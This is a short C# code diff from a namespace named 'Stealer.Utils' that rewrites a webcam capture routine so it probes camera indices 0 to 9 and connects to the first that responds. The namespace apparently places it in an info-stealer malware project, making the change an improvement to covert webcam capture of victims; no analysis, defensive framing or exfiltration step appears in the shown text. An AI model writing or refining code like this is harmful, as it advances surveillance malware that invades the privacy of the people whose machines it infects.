@@ -78,15 +78,16 @@ namespace Stealer.Utils
                     return;
                 }
 
-                // Connect to webcam driver (_selectedCamIndex or search 0..9)
-                IntPtr connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)_selectedCamIndex, IntPtr.Zero);
-                if (connected == IntPtr.Zero)
+                // Automatically detect active camera hardware (try index 0..9)
+                IntPtr connected = IntPtr.Zero;
+                int foundIndex = -1;
+                for (int i = 0; i < 10; i++)
                 {
-                    for (int i = 0; i < 10; i++)
+                    connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)i, IntPtr.Zero);
+                    if (connected != IntPtr.Zero)
                     {
-                        if (i == _selectedCamIndex) continue;
-                        connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)i, IntPtr.Zero);
-                        if (connected != IntPtr.Zero) break;
+                        foundIndex = i;
+                        break;
                     }
                 }
 
